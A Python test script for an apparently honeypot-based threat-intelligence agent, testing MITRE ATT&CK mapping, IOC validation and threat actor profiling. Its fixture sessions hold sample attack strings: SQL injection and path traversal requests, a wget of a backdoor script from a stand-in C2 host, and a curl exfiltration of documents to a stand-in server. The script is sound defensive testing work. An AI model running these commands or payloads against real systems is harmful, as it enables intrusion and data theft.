#!/usr/bin/env python3
"""
Enhanced test script for MITRE ATT&CK Task 5.2 implementation
Tests automated technique mapping, classification algorithms, IOC validation, and threat actor profiling
"""

import asyncio
import json
import logging
from datetime import datetime, timedelta
from agents.intelligence.mitre_mapper import MitreAttackMapper
from agents.intelligence.intelligence_agent import IntelligenceAgent

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def create_advanced_campaign_sessions():
    """Create multiple related session data for campaign analysis"""
    base_time = datetime.utcnow()
    
    sessions = []
    
    # Session 1: Initial reconnaissance
    sessions.append({
        "session_id": "campaign-001-recon",
        "metadata": {
            "honeypot_type": "web_admin",
            "source_ip": "203.0.113.42",
            "start_time": base_time.isoformat(),
            "end_time": (base_time + timedelta(minutes=15)).isoformat(),
            "duration_seconds": 900,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        },
        "transcript": [
            {
                "timestamp": base_time.isoformat(),
                "type": "http_request",
                "content": "GET /admin/login.php HTTP/1.1"
            },
            {
                "timestamp": (base_time + timedelta(seconds=30)).isoformat(),
                "type": "http_request",
                "content": "GET /admin/users.php?id=1' UNION SELECT 1,2,3,4-- HTTP/1.1"
            },
            {
                "timestamp": (base_time + timedelta(seconds=60)).isoformat(),
                "type": "http_request",
                "content": "GET /admin/config.php?file=../../../etc/passwd HTTP/1.1"
            }
        ]
    })
    
    # Session 2: Exploitation and persistence
    sessions.append({
        "session_id": "campaign-001-exploit",
        "metadata": {
            "honeypot_type": "ssh",
            "source_ip": "203.0.113.42",
            "start_time": (base_time + timedelta(hours=2)).isoformat(),
            "end_time": (base_time + timedelta(hours=2, minutes=30)).isoformat(),
            "duration_seconds": 1800,
            "user_agent": "OpenSSH_8.0"
        },
        "transcript": [
            {
                "timestamp": (base_time + timedelta(hours=2)).isoformat(),
                "type": "command",
                "content": "whoami"
            },
            {
                "timestamp": (base_time + timedelta(hours=2, minutes=1)).isoformat(),
                "type": "command",
                "content": "uname -a"
            },
            {
                "timestamp": (base_time + timedelta(hours=2, minutes=5)).isoformat(),
                "type": "command",
                "content": "wget http://malicious-c2.com/backdoor.sh"
            },
            {
                "timestamp": (base_time + timedelta(hours=2, minutes=10)).isoformat(),
                "type": "command",
                "content": "chmod +x backdoor.sh && ./backdoor.sh"
            },
            {
                "timestamp": (base_time + timedelta(hours=2, minutes=15)).isoformat(),
                "type": "command",
                "content": "crontab -e"
            }
        ]
    })
    
    # Session 3: Data collection and exfiltration
    sessions.append({
        "session_id": "campaign-001-collect",
        "metadata": {
            "honeypot_type": "file_share",
            "source_ip": "203.0.113.42",
            "start_time": (base_time + timedelta(hours=6)).isoformat(),
            "end_time": (base_time + timedelta(hours=6, minutes=45)).isoformat(),
            "duration_seconds": 2700,
            "user_agent": "SMB Client"
        },
        "transcript": [
            {
                "timestamp": (base_time + timedelta(hours=6)).isoformat(),
                "type": "command",
                "content": "find /home -name '*.doc' -o -name '*.pdf'"
            },
            {
                "timestamp": (base_time + timedelta(hours=6, minutes=10)).isoformat(),
                "type": "command",
                "content": "tar -czf /tmp/data.tar.gz /home/user/documents/"
            },
            {
                "timestamp": (base_time + timedelta(hours=6, minutes=30)).isoformat(),
                "type": "command",
                "content": "curl -X POST -F 'file=@/tmp/data.tar.gz' http://exfil-server.com/upload"
            }
        ]
    })
    
    return sessions

def create_complex_iocs():
    """Create complex IOCs for advanced validation testing"""
    return [
        {
            "type": "ip_address",
            "value": "203.0.113.42",
            "confidence": 0.9,
            "context": "Persistent attacker IP across multiple sessions"
        },
        {
            "type": "domain",
            "value": "malicious-c2.com",
            "confidence": 0.85,
            "context": "Command and control domain"
        },
        {
            "type": "url",
            "value": "http://exfil-server.com/upload",
            "confidence": 0.8,
            "context": "Data exfiltration endpoint"
        },
        {
            "type": "file_hash_sha256",
            "value": "a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456",
            "confidence": 0.95,
            "context": "Malicious backdoor hash"
        },
        {
            "type": "file_path",
            "value": "/tmp/backdoor.sh",
            "confidence": 0.7,
            "context": "Malicious script location"
        }
    ]

async def test_enhanced_mitre_mapping():
    """Test enhanced MITRE ATT&CK mapping capabilities"""
    logger.info("Testing Enhanced MITRE ATT&CK Mapping (Task 5.2)...")
    
    mapper = MitreAttackMapper()
    
    # Test 1: Advanced campaign classification
    logger.info("Test 1: Attack Campaign Classification")
    campaign_sessions = create_advanced_campaign_sessions()
    campaign_analysis = mapper.classify_attack_campaign(campaign_sessions)
    
    logger.info(f"Campaign Analysis Results:")
    logger.info(f"  Campaign ID: {campaign_analysis.get('campaign_id', 'Unknown')}")
    logger.info(f"  Session Count: {campaign_analysis.get('session_count', 0)}")
    logger.info(f"  Total Techniques: {campaign_analysis.get('total_techniques', 0)}")
    logger.info(f"  Unique Techniques: {campaign_analysis.get('unique_techniques', 0)}")
    
    sophistication = campaign_analysis.get('campaign_sophistication', {})
    logger.info(f"  Campaign Sophistication: {sophistication.get('overall_level', 'Unknown')}")
    
    attack_patterns = campaign_analysis.get('attack_pattern_classification', {})
    logger.info(f"  Primary Attack Pattern: {attack_patterns.get('primary_pattern', 'Unknown')}")
    
    # Test 2: Advanced IOC validation
    logger.info("\nTest 2: Advanced IOC Validation")
    complex_iocs = create_complex_iocs()
    validated_iocs = mapper.advanced_ioc_validation(complex_iocs)
    
    logger.info(f"Advanced IOC Validation Results:")
    logger.info(f"  Total IOCs Validated: {len(validated_iocs)}")
    
    for ioc in validated_iocs:
        validation_results = ioc.get('validation_results', {})
        risk_assessment = ioc.get('risk_assessment', {})
        
        logger.info(f"  IOC: {ioc.get('value', 'Unknown')}")
        logger.info(f"    Reputation Score: {validation_results.get('reputation_score', 0):.2f}")
        logger.info(f"    Severity: {risk_assessment.get('severity', 'Unknown')}")
        logger.info(f"    Containment Priority: {risk_assessment.get('containment_priority', 0)}")
    
    # Test 3: Enhanced threat actor profiling
    logger.info("\nTest 3: Enhanced Threat Actor Profiling")
    
    # Get techniques from first session for profiling
    first_session = campaign_sessions[0]
    techniques = mapper.map_techniques_from_session(first_session)
    
    enhanced_profile = mapper.generate_threat_actor_profile_advanced(
        techniques, validated_iocs, first_session.get("metadata", {})
    )
    
    logger.info(f"Enhanced Threat Actor Profiling Results:")
    
    profile_analysis = enhanced_profile.get('profile_analysis', {})
    technique_fingerprint = profile_analysis.get('technique_fingerprint', {})
    logger.info(f"  Technique Fingerprint:")
    logger.info(f"    Unique Techniques: {technique_fingerprint.get('unique_techniques', 0)}")
    logger.info(f"    Diversity Score: {technique_fingerprint.get('technique_diversity_score', 0):.2f}")
    
    top_matches = enhanced_profile.get('top_actor_matches', [])
    if top_matches:
        logger.info(f"  Top Actor Matches:")
        for match in top_matches[:3]:
            logger.info(f"    {match.get('actor_name', 'Unknown')}: {match.get('similarity_score', 0):.2f}")
    
    confidence_level = enhanced_profile.get('confidence_level', 'Unknown')
    logger.info(f"  Overall Confidence: {confidence_level}")
    
    # Test 4: Technique classification algorithms
    logger.info("\nTest 4: Technique Classification Algorithms")
    
    all_techniques = []
    for session in campaign_sessions:
        session_techniques = mapper.map_techniques_from_session(session)
        all_techniques.extend(session_techniques)
    
    # Test tactic progression analysis
    tactic_progression = mapper._analyze_tactic_progression(all_techniques)
    logger.info(f"Tactic Progression Analysis:")
    logger.info(f"  Tactic Sequence: {tactic_progression.get('tactic_sequence', [])}")
    logger.info(f"  Progression Analysis: {tactic_progression.get('progression_analysis', 'Unknown')}")
    
    # Test kill chain coverage
    kill_chain_coverage = mapper._analyze_kill_chain_coverage(all_techniques)
    logger.info(f"Kill Chain Coverage:")
    logger.info(f"  Coverage Percentage: {kill_chain_coverage.get('coverage_percentage', 0):.1f}%")
    logger.info(f"  Covered Phases: {kill_chain_coverage.get('covered_phases', [])}")
    
    # Test sophistication metrics
    sophistication_metrics = mapper._calculate_sophistication_metrics(all_techniques)
    logger.info(f"Sophistication Metrics:")
    logger.info(f"  Level: {sophistication_metrics.get('sophistication_level', 'Unknown')}")
    logger.info(f"  Score: {sophistication_metrics.get('sophistication_score', 0):.1f}")
    logger.info(f"  Technique Diversity: {sophistication_metrics.get('technique_diversity', 0)}")

async def test_intelligence_agent_enhanced_mitre():
    """Test Intelligence Agent with enhanced MITRE capabilities"""
    logger.info("\nTesting Intelligence Agent Enhanced MITRE Integration...")
    
    # Initialize agent
    config = {
        "analysis": {
            "confidence_threshold": 0.5,
            "max_concurrent_analyses": 3
        }
    }
    
    agent = IntelligenceAgent(config)
    
    try:
        # Start agent
        await agent.start()
        
        # Test enhanced MITRE analysis
        logger.info("Testing enhanced MITRE analysis...")
        campaign_sessions = create_advanced_campaign_sessions()
        
        enhanced_mitre_message = {
            "type": "mitre_analysis",
            "session_data": campaign_sessions[0]
        }
        
        result = await agent.process_message(enhanced_mitre_message)
        
        if result.get("status") == "success":
            mitre_analysis = result.get("mitre_analysis", {})
            logger.info(f"Enhanced MITRE Analysis Results:")
            logger.info(f"  Techniques: {len(mitre_analysis.get('techniques', []))}")
            logger.info(f"  Enhanced IOCs: {len(mitre_analysis.get('enhanced_iocs', []))}")
            
            threat_profile = mitre_analysis.get("threat_profile", {})
            logger.info(f"  Threat Profile Confidence: {threat_profile.get('confidence_level', 'Unknown')}")
        
        # Test campaign classification
        logger.info("\nTesting campaign classification...")
        
        campaign_message = {
            "type": "classify_attack_campaign",
            "session_data_list": campaign_sessions
        }
        
        campaign_result = await agent.process_message(campaign_message)
        
        if campaign_result.get("status") == "success":
            campaign_classification = campaign_result.get("campaign_classification", {})
            logger.info(f"Campaign Classification Results:")
            logger.info(f"  Session Count: {campaign_classification.get('session_count', 0)}")
            logger.info(f"  Total Techniques: {campaign_classification.get('total_techniques', 0)}")
            
            sophistication = campaign_classification.get('campaign_sophistication', {})
            logger.info(f"  Sophistication: {sophistication.get('overall_level', 'Unknown')}")
        
        # Test advanced IOC validation
        logger.info("\nTesting advanced IOC validation...")
        
        ioc_validation_message = {
            "type": "advanced_ioc_validation",
            "iocs": create_complex_iocs()
        }
        
        ioc_result = await agent.process_message(ioc_validation_message)
        
        if ioc_result.get("status") == "success":
            validation_summary = ioc_result.get("validation_summary", {})
            logger.info(f"IOC Validation Results:")
            logger.info(f"  Total IOCs: {validation_summary.get('total_iocs', 0)}")
            logger.info(f"  High Confidence: {validation_summary.get('high_confidence', 0)}")
            logger.info(f"  Threat Intel Matches: {validation_summary.get('threat_intel_matches', 0)}")
        
        # Test enhanced threat landscape report
        logger.info("\nTesting threat landscape report...")
        
        landscape_report = await agent.generate_mitre_threat_landscape_report("24h")
        
        if landscape_report.get("status") == "success":
            report = landscape_report.get("threat_landscape_report", {})
            exec_summary = report.get("executive_summary", {})
            
            logger.info(f"Threat Landscape Report:")
            logger.info(f"  Total Sessions: {exec_summary.get('total_sessions', 0)}")
            logger.info(f"  Unique Techniques: {exec_summary.get('unique_techniques', 0)}")
            
            top_vectors = exec_summary.get('top_attack_vectors', [])
            if top_vectors:
                logger.info(f"  Top Attack Vector: {top_vectors[0].get('vector', 'Unknown')}")
        
        # Test enhanced statistics
        logger.info("\nTesting enhanced MITRE statistics...")
        
        enhanced_stats = await agent.get_enhanced_mitre_statistics("24h", include_campaign_analysis=True)
        
        if enhanced_stats.get("status") == "success":
            statistics = enhanced_stats.get("statistics", {})
            logger.info(f"Enhanced Statistics:")
            logger.info(f"  Total Sessions: {statistics.get('total_sessions', 0)}")
            logger.info(f"  Unique Techniques: {statistics.get('unique_techniques', 0)}")
            
            campaign_analysis = enhanced_stats.get("campaign_analysis")
            if campaign_analysis:
                logger.info(f"  Campaign Analysis Available: Yes")
            else:
                logger.info(f"  Campaign Analysis Available: No")
        
    finally:
        # Stop agent
        await agent.stop()

async def test_mitre_classification_algorithms():
    """Test specific MITRE classification algorithms"""
    logger.info("\nTesting MITRE Classification Algorithms...")
    
    mapper = MitreAttackMapper()
    
    # Test technique fingerprinting
    logger.info("Testing technique fingerprinting...")
    campaign_sessions = create_advanced_campaign_sessions()
    
    all_techniques = []
    for session in campaign_sessions:
        techniques = mapper.map_techniques_from_session(session)
        all_techniques.extend(techniques)
    
    fingerprint = mapper._generate_technique_fingerprint(all_techniques)
    logger.info(f"Technique Fingerprint:")
    logger.info(f"  Technique Count: {fingerprint.get('technique_count', 0)}")
    logger.info(f"  Unique Techniques: {fingerprint.get('unique_techniques', 0)}")
    logger.info(f"  Diversity Score: {fingerprint.get('technique_diversity_score', 0):.2f}")
    
    # Test behavioral signature generation
    logger.info("\nTesting behavioral signature generation...")
    iocs = create_complex_iocs()
    behavioral_sig = mapper._generate_behavioral_signature(all_techniques, iocs)
    
    logger.info(f"Behavioral Signature:")
    logger.info(f"  Command Patterns: {len(behavioral_sig.get('command_patterns', []))}")
    logger.info(f"  Infrastructure Patterns: {behavioral_sig.get('infrastructure_patterns', {})}")
    
    # Test attack pattern classification
    logger.info("\nTesting attack pattern classification...")
    attack_patterns = mapper._classify_attack_patterns(all_techniques)
    
    logger.info(f"Attack Pattern Classification:")
    logger.info(f"  Primary Pattern: {attack_patterns.get('primary_pattern', 'Unknown')}")
    logger.info(f"  Pattern Confidence: {attack_patterns.get('pattern_confidence', 0):.2f}")
    
    # Test defensive gap identification
    logger.info("\nTesting defensive gap identification...")
    defensive_gaps = mapper._identify_defensive_gaps(all_techniques)
    
    logger.info(f"Defensive Gaps Identified: {len(defensive_gaps)}")
    for gap in defensive_gaps:
        logger.info(f"  Gap: {gap.get('gap_type', 'Unknown')} (Severity: {gap.get('severity', 'Unknown')})")

async def main():
    """Main test function"""
    logger.info("Starting Enhanced MITRE ATT&CK Task 5.2 Tests")
    logger.info("=" * 60)
    
    try:
        # Test enhanced MITRE mapping
        await test_enhanced_mitre_mapping()
        
        print("\n" + "=" * 60 + "\n")
        
        # Test Intelligence Agent enhanced MITRE integration
        await test_intelligence_agent_enhanced_mitre()
        
        print("\n" + "=" * 60 + "\n")
        
        # Test MITRE classification algorithms
        await test_mitre_classification_algorithms()
        
        logger.info("\n" + "=" * 60)
        logger.info("All Enhanced MITRE ATT&CK Task 5.2 tests completed successfully!")
        logger.info("Task 5.2 Implementation Summary:")
        logger.info("✅ Automated technique mapping to MITRE framework")
        logger.info("✅ Tactic and technique classification algorithms")
        logger.info("✅ IOC extraction and validation processes")
        logger.info("✅ Threat actor profiling and attribution capabilities")
        logger.info("✅ Enhanced campaign analysis and classification")
        logger.info("✅ Advanced behavioral signature generation")
        logger.info("✅ Sophisticated attack pattern recognition")
        logger.info("✅ Comprehensive threat landscape reporting")
        
    except Exception as e:
        logger.error(f"Test failed: {e}")
        raise

if __name__ == "__main__":
    asyncio.run(main())